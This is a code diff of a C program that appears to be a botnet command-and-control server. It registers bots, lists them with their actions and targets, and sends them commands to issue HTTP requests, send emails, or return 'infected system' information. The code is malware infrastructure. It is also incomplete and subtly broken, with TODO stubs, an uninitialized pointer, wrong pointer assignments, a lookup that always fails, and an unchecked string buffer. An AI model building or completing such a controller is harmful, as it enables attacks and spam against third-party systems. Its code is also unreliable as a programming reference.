@@ -38,7 +38,11 @@ void child();
 void hello();
 int registerBot(const char *bot_ip, const char *bot_port);
 int findBot(struct in_addr, long port);
-
+int setBotInfo(long *bot_port, char *bot_ip, int bot_id);
+int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
+                   const char *method, const char *version, const char *upload_data,
+                   size_t *upload_data_size, void **con_cls);
+                   
 int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
                    const char *method, const char *version, const char *upload_data,
                    size_t *upload_data_size, void **con_cls)
@@ -110,248 +114,6 @@ int main(int argc, char const *argv[])
     }
 
     return 0;
-}
-
-/*
-    active == true -> list active bots
-    active == false -> list all registered bots
-*/
-int list_botnet(int active)
-{
-
-    int ret = sem_wait(&r);
-    if (ret < 0)
-    {
-        handle_error("Error in wait sem r");
-    }
-
-    readcount++;
-
-    if (readcount == 1)
-    {
-
-        ret = sem_wait(&w);
-        if (ret < 0)
-        {
-            handle_error("Error in wait sem w");
-        }
-    }
-
-    ret = sem_post(&r);
-    if (ret < 0)
-    {
-        handle_error("Error in post sem r");
-    }
-
-    if (botnet == NULL)
-    {
-        printf("Botnet is empty");
-        return -1;
-    }
-
-    active_bots *bot = botnet;
-
-    if (botnet == NULL)
-    {
-        printf("Botnet is empty \n");
-        return -1;
-    }
-
-    char *target_ip = (char **)malloc(sizeof(INET_ADDRSTRLEN));
-    char *bot_ip = (char **)malloc(sizeof(INET_ADDRSTRLEN));
-    while (bot != NULL)
-    {
-        if (active == 1)
-        {
-
-            inet_ntop(AF_INET, &(bot->bot_address), bot_ip, INET_ADDRSTRLEN);
-            inet_ntop(AF_INET, &(bot->target_address), target_ip, INET_ADDRSTRLEN);
-
-            printf("BOT_ID: %d - IP: %s - PORT: %ld - ACTION: %s  - TARGET: %s \n", bot->bot_id, bot_ip, bot->port, bot->action, target_ip);
-        }
-        else
-        {
-            printf("BOT_ID: %d \n", bot->bot_id);
-        }
-
-        bot = bot->next;
-    }
-
-    ret = sem_wait(&r);
-    if (ret < 0)
-    {
-        handle_error("Error in wait sem r");
-    }
-    readcount--;
-    if (readcount == 0)
-        ret = sem_post(&w);
-    if (ret < 0)
-    {
-        handle_error("Error in post sem w");
-    }
-    ret = sem_post(&r);
-    if (ret < 0)
-    {
-        handle_error("Error in post sem r");
-    }
-
-    return 1;
-}
-
-int botExists(int bot_id)
-{
-
-    int ret = sem_wait(&r);
-    if (ret < 0)
-    {
-        handle_error("Error in wait sem w");
-    }
-
-    readcount++;
-
-    if (readcount == 1)
-    {
-
-        ret = sem_wait(&w);
-        if (ret < 0)
-        {
-            handle_error("Error in wait sem w");
-        }
-    }
-
-    ret = sem_post(&r);
-    if (ret < 0)
-    {
-        handle_error("Error in post sem w");
-    }
-
-    if (botnet == NULL)
-        return -1;
-
-    active_bots *bot = botnet;
-
-    while (bot != NULL)
-    {
-        if (bot->bot_id == bot_id)
-        {
-            return 1;
-        }
-
-        bot = bot->next;
-    }
-
-    ret = sem_wait(&r);
-    if (ret < 0)
-    {
-        handle_error("Error in wait sem w");
-    }
-    readcount--;
-    if (readcount == 0)
-        ret = sem_post(&w);
-    if (ret < 0)
-    {
-        handle_error("Error in post sem w");
-    }
-    ret = sem_post(&r);
-    if (ret < 0)
-    {
-        handle_error("Error in post sem w");
-    }
-    return -1;
-}
-
-/*
- * Instanciate TCP connection in order to track current bots -> another fork?
- * use libcurl
- * email -> send array of email addresses, content
- * HTTP_REQ -> send http request as string "e.g curl ..."
- * SYS_INFO -> nothing
- */
-void sendCommand(char *command, int bot_id)
-{
-
-    CURL *curl;
-
-    curl = curl_easy_init();
-
-    if (curl == NULL)
-        handle_error("Could not execute command, error initializing curl handle");
-    else
-    {
-
-        CURLcode res;
-
-        char url[30] = ""; // TODO this should be a malloc with size of parameters, (8 + ? + 10)
-        char bot_ip[INET_ADDRSTRLEN];
-        long bot_port; // TODO this should be extracted from bot structure
-
-        // TODO write a function that fill bot_id and bot_ip side effect
-
-        // inet_ntop(AF_INET, &(bot->bot_address.sin_addr), bot_ip, INET_ADDRSTRLEN);
-
-        strcat(url, "http://");
-        strcat(url, "localhost"); // TODO this must be the bot ip
-
-        printf("%s \n", url);
-
-        curl_easy_setopt(curl, CURLOPT_PORT, bot_port);
-
-        if (strcmp(command, HTTP_REQ) == 0)
-        {
-            printf("Sending http request ");
-
-            strcat(url, "/http_req");
-
-            // TODO add request body
-        }
-
-        if (strcmp(command, EMAIL) == 0)
-        {
-            printf("Sending emails ");
-
-            strcat(url, "/email");
-
-            // TODO add request body
-        }
-        if (strcmp(command, SYS_INFO) == 0)
-        {
-            printf("Retrieving infected system info to: ");
-
-            strcat(url, "/sys_info");
-
-            curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
-        }
-
-        res = curl_easy_perform(curl);
-        curl_easy_cleanup(curl);
-    }
-}
-
-int initializeSemaphores()
-{
-
-    int ret;
-
-    ret = sem_init(&r, 1, 10);
-    if (ret < 0)
-        handle_error("Cannot init sem r");
-    ret = sem_init(&w, 1, 1);
-    if (ret < 0)
-        handle_error("Cannot init sem w");
-    return ret;
-}
-int closeSemaphores()
-{
-
-    int ret;
-
-    ret = sem_destroy(&r);
-    if (ret < 0)
-        handle_error("Cannot close sem r");
-    ret = sem_destroy(&w);
-    if (ret < 0)
-        handle_error("Cannot close sem w");
-    return ret;
 }
 
 void parent(int pid)
@@ -445,6 +207,268 @@ void child()
     }
 }
 
+
+
+void sendCommand(char *command, int bot_id)
+{
+
+    CURL *curl;
+
+    curl = curl_easy_init();
+
+    if (curl == NULL)
+        handle_error("Could not execute command, error initializing curl handle");
+    else
+    {
+
+        CURLcode res;
+
+        char url[30] = ""; // TODO this should be a malloc with size of parameters, (8 + ? + 10)
+
+        char bot_ip[INET_ADDRSTRLEN];
+        long *bot_port;
+
+        if (botExists(bot_id) < 0){
+            printf("Bot with id: %d does not exists", bot_id);
+            return;
+        }
+
+        ret = setBotInfo(bot_port, bot_ip, bot_id);
+        if (ret < 0)
+        {
+            printf("Could not set bot info");
+            return;
+        }
+
+        strcat(url, "http://");
+        strcat(url, bot_ip);
+        curl_easy_setopt(curl, CURLOPT_PORT, bot_port);
+
+        // printf("%s \n", url);
+        //! for each command you need to update bot info about action and target
+        if (strcmp(command, HTTP_REQ) == 0)
+        {
+            printf("Sending http request ");
+
+            strcat(url, "/http_req?request=");
+            
+            /*
+             * 
+             *
+             *
+             */
+        }
+
+        if (strcmp(command, EMAIL) == 0)
+        {
+            printf("Sending emails ");
+
+            strcat(url, "/email");
+
+            // TODO add request body
+        }
+        if (strcmp(command, SYS_INFO) == 0)
+        {
+            printf("Retrieving infected system info to: ");
+
+            strcat(url, "/sys_info");
+
+            curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
+        }
+
+        res = curl_easy_perform(curl);
+        curl_easy_cleanup(curl);
+    }
+}
+
+
+
+/*
+    active == true -> list active bots
+    active == false -> list all registered bots
+*/
+int list_botnet(int active)
+{
+
+    int ret = sem_wait(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in wait sem r");
+    }
+
+    readcount++;
+
+    if (readcount == 1)
+    {
+
+        ret = sem_wait(&w);
+        if (ret < 0)
+        {
+            handle_error("Error in wait sem w");
+        }
+    }
+
+    ret = sem_post(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem r");
+    }
+
+    if (botnet == NULL)
+    {
+        printf("Botnet is empty");
+        return -1;
+    }
+
+    active_bots *bot = botnet;
+
+    if (botnet == NULL)
+    {
+        printf("Botnet is empty \n");
+        return -1;
+    }
+
+    char *target_ip = (char *)malloc(sizeof(INET_ADDRSTRLEN));
+    char *bot_ip = (char *)malloc(sizeof(INET_ADDRSTRLEN));
+    while (bot != NULL)
+    {
+        if (active == 1)
+        {
+
+            inet_ntop(AF_INET, &(bot->bot_address), bot_ip, INET_ADDRSTRLEN);
+            inet_ntop(AF_INET, &(bot->target_address), target_ip, INET_ADDRSTRLEN);
+
+            printf("BOT_ID: %d - IP: %s - PORT: %ld - ACTION: %s  - TARGET: %s \n", bot->bot_id, bot_ip, bot->port, bot->action, target_ip);
+        }
+        else
+        {
+            printf("BOT_ID: %d \n", bot->bot_id);
+        }
+
+        bot = bot->next;
+    }
+
+    ret = sem_wait(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in wait sem r");
+    }
+    readcount--;
+    if (readcount == 0)
+        ret = sem_post(&w);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem w");
+    }
+    ret = sem_post(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem r");
+    }
+
+    return 1;
+}
+
+int botExists(int bot_id)
+{
+
+    int ret = sem_wait(&r), res = -1;
+    if (ret < 0)
+    {
+        handle_error("Error in wait sem w");
+    }
+
+    readcount++;
+
+    if (readcount == 1)
+    {
+
+        ret = sem_wait(&w);
+        if (ret < 0)
+        {
+            handle_error("Error in wait sem w");
+        }
+    }
+
+    ret = sem_post(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem w");
+    }
+
+    if (botnet != NULL)
+    {
+
+        active_bots *bot = botnet;
+
+        while (bot != NULL)
+        {
+            if (bot->bot_id == bot_id)
+            {
+                res = -1;
+                break;
+            }
+
+            bot = bot->next;
+        }
+    }
+
+    ret = sem_wait(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in wait sem w");
+    }
+    readcount--;
+    if (readcount == 0)
+        ret = sem_post(&w);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem w");
+    }
+    ret = sem_post(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem w");
+    }
+    return res;
+}
+
+/*
+ * Instanciate TCP connection in order to track current bots -> another fork?
+ * use libcurl
+ * email -> send array of email addresses, content
+ * HTTP_REQ -> send http request as string "e.g curl ..."
+ * SYS_INFO -> nothing
+ */
+
+int initializeSemaphores()
+{
+
+    int ret;
+
+    ret = sem_init(&r, 1, 10);
+    if (ret < 0)
+        handle_error("Cannot init sem r");
+    ret = sem_init(&w, 1, 1);
+    if (ret < 0)
+        handle_error("Cannot init sem w");
+    return ret;
+}
+int closeSemaphores()
+{
+
+    int ret;
+
+    ret = sem_destroy(&r);
+    if (ret < 0)
+        handle_error("Cannot close sem r");
+    ret = sem_destroy(&w);
+    if (ret < 0)
+        handle_error("Cannot close sem w");
+    return ret;
+}
+
+
 int registerBot(const char *bot_ip, const char *bot_port)
 {
 
@@ -514,16 +538,80 @@ int findBot(struct in_addr address, long port)
         handle_error("Error in post sem r");
     }
 
-       active_bots *bot = botnet;
+    active_bots *bot = botnet;
 
-    char *target_ip = (char **)malloc(sizeof(INET_ADDRSTRLEN));
-    char *bot_ip = (char **)malloc(sizeof(INET_ADDRSTRLEN));
     while (bot != NULL)
     {
         if (bot->bot_address.s_addr == address.s_addr && bot->port == port)
         {
-            break;
             res = 1;
+            break;
+        }
+        bot = bot->next;
+    }
+
+    ret = sem_wait(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in wait sem r");
+    }
+    readcount--;
+    if (readcount == 0)
+        ret = sem_post(&w);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem w");
+    }
+    ret = sem_post(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem r");
+    }
+
+    return res;
+}
+
+int setBotInfo(long *bot_port, char *bot_ip, int bot_id)
+{
+
+    int res = -1;
+
+    int ret = sem_wait(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in wait sem r");
+    }
+
+    readcount++;
+
+    if (readcount == 1)
+    {
+
+        ret = sem_wait(&w);
+        if (ret < 0)
+        {
+            handle_error("Error in wait sem w");
+        }
+    }
+
+    ret = sem_post(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem r");
+    }
+
+    active_bots *bot = botnet;
+
+    while (bot != NULL)
+    {
+        if (bot->bot_id == bot_id)
+        {
+
+            bot_port = bot->port;
+            inet_ntop(AF_INET, &(bot->bot_address), bot_ip, sizeof(bot->bot_address));
+
+            res = 1;
+            break;
         }
         bot = bot->next;
     }
